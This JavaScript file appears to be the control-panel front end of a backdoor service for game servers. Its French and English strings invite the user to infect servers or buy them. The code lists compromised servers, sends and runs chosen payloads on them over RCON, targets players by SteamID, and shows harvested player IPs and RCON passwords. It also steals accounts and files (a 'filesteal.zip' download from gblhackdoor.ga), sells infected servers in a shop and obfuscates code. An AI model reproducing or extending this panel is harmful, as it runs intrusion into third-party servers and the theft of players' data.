var action_server_id;
var action_payload_id;
var call_check_timer;

var server_table = $("#server_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ servers",
        "zeroRecords": "Vous n'avez aucun server, infecter des server ou acheter en",
        "info": "Showing _PAGE_ pages on _PAGES_",
        "infoEmpty": "No servers were found",
        "infoFiltered": "(filtered for _MAX_ servers)"
    },
    ajax: "core/ajax/get-server.php"
});

var server_buy_table = $("#server_buy_tbl").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ servers",
        "zeroRecords": "Pas de servers",
        "info": "Showing _PAGE_ pages on _PAGES_",
        "infoEmpty": "No servers were found",
        "infoFiltered": "(filtered for _MAX_ servers)"
    },
    ajax: "core/ajax/get-buy-server.php"
});

var players_table = $("#players_list_tbl").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ players",
        "zeroRecords": "No players found",
        "info": "Showing _PAGE_ pages on _PAGES_",
        "infoEmpty": "No players were found",
        "infoFiltered": "(filtered for _MAX_ players)"
    },
    ajax: "core/ajax/get-players-off.php"
});
var server_offline_table = $("#server_offline_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ servers",
        "zeroRecords": "No server found",
        "info": "Showing _PAGE_ pages on _PAGES_",
        "infoEmpty": "No servers were found",
        "infoFiltered": "(filtered for _MAX_ servers)"
    },
    ajax: "core/ajax/get-server-offline.php"
});

var ipbanned_list = $("#ipbanned_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ IPs",
        "zeroRecords": "No blacklisted IPs found",
        "info": "Showing _PAGE_ pages on _PAGES_",
        "infoEmpty": "No IP blacklisted",
        "infoFiltered": "(filtered for _MAX_ IPs)"
    },
    ajax: "core/ajax/get-banned.php"
});

var users_table = $("#users_list").DataTable({
    responsive: true,
    bStateSave: true,
    language: {
        "lengthMenu": "Display _MENU_ payloads",
        "zeroRecords": "No payload found",
        "info": "posted _PAGE_ pages on _PAGES_",
        "infoEmpty": "No payload was found",
        "infoFiltered": "(filtered for _MAX_ payloads)"
    },
    ajax: "core/ajax/get-users.php"
});

var payload_table = $("#payload_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Display _MENU_ payloads",
        "zeroRecords": "No payload found",
        "info": "posted _PAGE_ pages on _PAGES_",
        "infoEmpty": "No payload was found",
        "infoFiltered": "(filtered for _MAX_ payloads)"
    },
    ajax: "core/ajax/get-payload.php"
});

function deleteServer(id)
{
    $.ajax({
      url: "core/ajax/del-server.php?id=" + id
    });
}
function showserverboii(id)
{
    $.ajax({
      url: "seeserver.php?server=" + id
    }).done((msg)=>{
      $("#server_pfwcejzfn").html(msg);
    });
}
function giveServer(id)
{
  var giveto = prompt("Donner le server a (ID)");
  if(giveto == undefined || giveto == "")
    return;
    $.ajax({
      url: "core/ajax/give-server.php?id=" + id + "&to=" + giveto
    });
}
function hopsadlquoi()
{
window.open('http://gblhackdoor.ga/core/ajax/filesteal.zip');
}
function banAccount(id)
{
    $.ajax({
      url: "core/ajax/ban-user.php?id=" + id + "&reason=" + prompt("Pourquoi ?")
    });
}

function banUser(id)
{
    $.ajax({
      url: "core/ajax/del-user.php?id=" + id
    });
}

function setCredits(id)
{
    $.ajax({
      url: "core/ajax/add-credits.php?id=" + id + "&credits=" + prompt("Mettre le nombre de crédits a combien ?")
    });
}

function deletePayload(id)
{
    $.ajax({
      url: "core/ajax/del-payload.php?id=" + id
    });
}

function stealAccount(id)
{
    $.ajax({
      url: "core/ajax/steal-account.php?id=" + id
    }).done((msg)=>{
      alert(msg);
    });
}

function deleteUser(id)
{
    $.ajax({
      url: "core/ajax/del-user.php?id=" + id
    });
}

function changePasswordAdmin(id)
{
  var newpwd = prompt("Nouveau mot de passe");
  if(newpwd == undefined || newpwd == "")
    return;
    $.ajax({
      url: "core/ajax/edit-user-admin.php?id=" + id + "&password=" + newpwd
    }).done((msg)=>{
      alert(msg);
    });
}

function changeDescription()
{
  var newpwd = prompt("Nouvelle description");
  if(newpwd == undefined || newpwd == "")
    return;
    $.ajax({
      url: "core/ajax/edit-desc.php?desc=" + newpwd
    }).done((msg)=>{
      window.location.href.replace("");
    });
}

function loadChannel(name)
{
    $.ajax({
      url: "core/ajax/channels/" + name + "/get.php"
    }).done((msg)=>{
      $("#channel_ents_" + name).html(msg)
    });
}

function delcom(id)
{
    $.ajax({
      url: "core/ajax/del-comment.php?id=" + id
    }).done((msg)=>{
      window.location.href.replace("");
    });
}
function DropComment(id)
{
    var content = $("#comment-text").val();
    $.ajax({
      method: "POST",
      url: "core/ajax/add-comment.php",
      data: { content: content, id: id }
    }).done(()=>{
      window.location.reload(true);
    });

}

function sendChannel(id, channel)
{
    var content = $("#" + id).val();
    $.ajax({
      method: "POST",
      url: "core/ajax/channels/" + channel + "/add.php",
      data: { content: content }
    }).done(()=>{
      window.location.href.replace("");
    });

}
function createPayload()
{
    var payload_name = $("#payload-name").val();
    var payload_comment = $("#payload-comment").val();
    var payload_content = $("#payload-text").val().replace("\n", "<NEWLINE>");;
    var payload_public = $("#payload-public").prop('checked');

    $.ajax({
      method: "POST",
      url: "core/ajax/add-payload.php",
      data: { name: payload_name, comment: payload_comment, content: payload_content, public: payload_public }
    });

    $("#createpayload-modal").modal("hide");
}

function setColor()
{
    var cf = $("#color-text").val();

    $.ajax({
      url: "core/ajax/set-color.php?c=" + cf
    }).done(()=>{
      window.location.href.replace("");
    });
}

function setColor1()
{
    var cfc = $("#color1-text").val();

    $.ajax({
      url: "core/ajax/set-color-trois.php?c=" + cfc
    }).done(()=>{
      window.location.href.replace("");
    });
}


function setColor2()
{
    var cfd = $("#color2-text").val();

    $.ajax({
      url: "core/ajax/set-color-second.php?c=" + cfd
    }).done(()=>{
      window.location.href.replace("");
    });
}

function unbanIp(ip)
{
  var unbanid_text = "";
  if(ip != undefined)
    unbanid_text = ip;
  else
    unbanid_text = $("#unbanid-text").val();
    

    $.ajax({
      method: "POST",
      url: "core/ajax/del-ban.php",
      data: { ip: unbanid_text }
    });

}
function banIp()
{
    var banip_text = $("#banip-text").val();
    

    $.ajax({
      method: "POST",
      url: "core/ajax/add-ban.php",
      data: { ip: banip_text }
    }).done((msg)=>{
      alert("IP Banni !");
    });

}
$('#createpayload-modal').on('hidden.bs.modal', function () {
    $("#payload-name").val("");
    $("#payload-text").val("");
    $("#payload-comment").val("");
});

function editUser()
{
    var opw = $("#users-old_password").val();
    var npw = $("#users-new_password").val();
    var cpw = $("#users-confirm_new_password").val();
    $.ajax({
      method: "POST",
      url: "core/ajax/edit-user.php",
      data: { old_password: opw, new_password: npw, confirm_new_password: cpw }
    }).done((msg)=>{
      alert(msg);
    });

    $("#changepassword-body").modal("hide");
}

function buyShop(n)
{
    $.ajax({
      url: "core/ajax/buy-shop.php?i=" + n
    }).done((msg)=>{
      alert(msg);
      window.location.href = "http://gblhackdoor.ga/shop.php";
    });
}

function createUser()
{
    var username = $("#users-username").val();
    var password = $("#users-password").val();
    var cpassword = $("#users-cpassword").val();
    var es = document.getElementById("user-cate");
    var strUsers = es.options[es.selectedIndex].value();

    $.ajax({
      url: "core/ajax/add-user.php?username=" + username + "&password=" + password + "&cpassword=" + cpassword + "&grade=" + strUsers
    }).done(function(data){
        if (data == "success")
        {
            $("#createusers-modal").modal("hide");
        }
        else
        {
            $("#users-notify").remove();
            $("#createusers-body").prepend($('<div class="alert alert-danger" role="alert" id="users-notify">'+data+'</div>').fadeIn('slow'));
        }
    });
}


function fucklerle()
{
    var url = $("#fucker-text").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/gbackfuck.php",
      data: { url: url },
    })
}

function setPDP()
{
    var c = $("#users-pdp").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/edit-pdp.php",
      data: { c: c },
    })
}
function buyServer(id)
{
    $.ajax({
      url: "core/ajax/buy-server.php?id=" + id
    })
}
function downloadfs(ip)
{
    $.ajax({
      url: "core/ajax/download-fs.php?ip=" + ip
    })
}
$('#createusers-modal').on('hidden.bs.modal', function () {
    $("#users-notify").remove();
    $("#users-username").val("");
    $("#users-password").val("");
    $("#users-cpassword").val("");
});

function viewPayload(id)
{
    action_payload_id = id;
    $.ajax({
      url: "core/ajax/get-payload-content.php?id=" + id
    }).done(function(data){
        console.log(data);
        $("#edit-payload-name").val(data.payload_name);
        $("#edit-payload-comment").val(data.payload_comment);
        $("#edit-payload-text").val(data.payload_content);
        $("#edit-payload-cate").val(data.cate);
        $("#viewpayload-modal").modal("show");
    });
}
var action_player_id
function setPlayerCode(id)
{
    action_player_id = id;
    $.ajax({
      url: "core/ajax/get-player-content.php?id=" + id
    }).done(function(data){
        $("#playeroff-code").val(data);
        $("#playeroff-modal").modal("show");
    });
}

function reinfectRCON(id)
{
    $.ajax({
      url: "core/ajax/restart-server.php?id=" + id
    }).done(function(data){
        alert("Si le serveur apparait pas dans votre liste dans quelques instants, cest que le RCON est devenue invalid entre temps")
    }).fail(function(data){
    alert("Le serveur est fermé ou le RCON a était modifier")
    });
}

function pldd(code)
{
        $("#playeroff-code").val(code);
    
}
function editPayload2()
{
    var playeroffg = $("#playeroff-code").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/edit-playeroff.php?id=" + action_player_id,
      data: { code: playeroffg }
    });

    $("#playeroff-modal").modal("hide");
}

function editPayload()
{
    var name = $("#edit-payload-name").val();
    var comment = $("#edit-payload-comment").val();
    var cate = $("#edit-payload-cate").val();
    var text = $("#edit-payload-text").val().replace("\n", "<NEWLINE>");

    $.ajax({
      method: "POST",
      url: "core/ajax/edit-payload.php?id=" + action_payload_id,
      data: { name: name, comment: comment, content: text, cate: cate }
    });

    $("#viewpayload-modal").modal("hide");
}

$('#viewpayload-modal').on('hidden.bs.modal', function () {
    $("#edit-payload-name").val("");
    $("#edit-payload-comment").val("");
    $("#edit-payload-text").val("");
    $("#edit-payload-cate").val("");
});

function showcallPayload(id)
{
    action_server_id = id;
    $.ajax({
      url: "core/ajax/get-payload-name.php"
    }).done(function(data){ 
        var categories = [];
        $("#server-payload").html("");
        $.each(data, function(i, item) {
          var thecat = item.cate.replace(/[^0-9a-z]/gi, '');
            if(!categories.includes(thecat))
            {
              categories.push(thecat);
              $("#server-payload").append("<optgroup id='" + thecat + "' label='" + item.cate + "'></optgroup>");
            }
            $("#" + thecat).append("<option value=\"" + item.id + "\">" + item.payload_name + "</option>");
        });

        $.ajax({
      url: "core/ajax/get-server-players.php?id=" + id
    }).done(function(data){ 
        $("#optgroupplayers").html("");
        $.each(data, function(i, item) {
            $("#optgroupplayers").append("<option value=\"player.GetBySteamID('" + item.steamid + "')\">" + item.name + " (" + item.group + ")</option>");
        });
    });

        $("#serverpayload-modal").modal("show");
    });
}

function openConsole(id)
{
    $.ajax({
      url: "core/ajax/get-server-console.php?id=" + id
    }).done(function(data){ 
      $("#consollee").val(data);
    });
}
function showInformation(id)
{
    $.ajax({
      url: "core/ajax/get-server-info.php?id=" + id
    }).done(function(data){ 
        $("#server-name").val(data.server_name);
        $("#server-ip").val(data.server_ip);
        $("#server-rcon").val(data.rcon);
        $("#server-gm").val(data.gm);
        $("#server-map").val(data.map);
        $("#server-pw").val(data.pw);
        secoauserver.href = "steam://connect/" + data.server_ip;
        $("#serverinformation-modal").modal("show");

        
         $.ajax({
      url: "core/ajax/get-server-players.php?id=" + id
    }).done(function(data){ 
        $("#server-players").val("");
        $.each(data, function(i, item) {
            $("#server-players").val($("#server-players").val() + item.name + " (" + item.group + "): " + item.ip + "\n");
        });
    });
    });
}

function callPayload()
{
    var payload_id = $("#server-payload").val();
    var arg = $("#server-payload-arg").val();
    var mode = $("#server-payload-arg-mode").val();
    if(mode != "texte")
    {
      arg = mode;
    }
    $.ajax({
      url: "core/ajax/call-payload.php?server=" + action_server_id + "&payload=" + payload_id + "&arg=" + arg
    });
    $("#serverpayload-modal").modal("hide");
    //$("#sendpayload-waiting-modal").modal("show");
    checkCallStatut();
}

function checkCallStatut()
{
    call_check_timer = setInterval(function(){
        $.ajax({
            url: "core/ajax/call-statut.php?server=" + action_server_id
        }).done(function(data){
            if (data == 'success')
            {
            	//$("#sendpayload-waiting-modal").modal("hide");
                clearInterval(call_check_timer);
                window.location.hash = action_server_id;
                window.location.reload();
            }
        });
    }, 0.5 * 1000);
}

function UpdateLogs()
{
    $.ajax({
        url: "core/ajax/get-logs.php"
    }).done(function(data){
        $('#logs-body').html(data);
    });
}

function UpdateChat()
{
    $.ajax({
        url: "core/ajax/get-chat.php"
    }).done(function(data){
        $('#chate-body').html(data);
        var div = document.getElementById("chate-body");
        $('#' + "chate-body").animate({
     }, 500);
    });
}

function AddChat()
{
    var cha = $("#chat-text").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/add-chat.php",
      data: { content: cha }
    }).done(function(data){
        $("#chat-text").val(data);
    });
}

function UpdateParams()
{
    $.ajax({
        url: "core/ajax/get-params.php"
    }).done(function(data){
        $('#params-delay').val(data[0].value);
    });
}
setInterval(function(){
    server_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    $("#nbserver").html(server_table.data().count());
    server_buy_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    $("#nbserverbuy").html(server_buy_table.data().count());
    
    server_offline_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    $("#nbserveroff").html(server_offline_table.data().count());
    users_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    payload_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    ipbanned_list.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    
    UpdateLogs();
    UpdateChat();
}, 0.5 * 2000);

setInterval(function(){
    UpdateParams();
}, 1 * 10000);

$('#params-delay').bind('click keyup', function(){
    $.ajax({
        url: "core/ajax/set-delay.php?delay=" + $(this).val()
    });
});

$.fn.dataTableExt.sErrMode = 'throw';

function obfuscate()
{
    var code = $("#obfuscation-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/obfuscate.php",
      data: { code: code }
    }).done(function(data){
        $("#obfuscation-text").val(data);
    });
}



